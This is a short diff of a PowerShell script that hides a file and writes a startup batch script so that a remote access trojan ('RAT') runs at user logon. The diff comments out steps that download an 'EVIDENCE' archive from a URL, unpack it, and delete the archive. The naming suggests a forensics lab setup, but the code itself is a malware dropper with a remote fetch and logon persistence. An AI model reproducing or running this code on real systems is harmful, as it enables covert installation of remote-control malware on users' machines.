@@ -37,10 +37,10 @@ $hideFile = get-item $localpath -Force
 $hideFile.attributes = "Hidden"
 
 # Download EVIDENCE to Temporary Storage
-New-Item -Path $evidenceoutput -ItemType Directory
-Invoke-WebRequest -uri $evidenceurl -OutFile $evidence
-expand-archive -path $evidence -destinationpath $evidenceoutput
-Remove-Item $evidence
+#New-Item -Path $evidenceoutput -ItemType Directory
+#Invoke-WebRequest -uri $evidenceurl -OutFile $evidence
+#expand-archive -path $evidence -destinationpath $evidenceoutput
+#Remove-Item $evidence
 
 # Add a startup script (BAT) to make sure RAT is run by the logging user
 add-content $startup "@echo off"
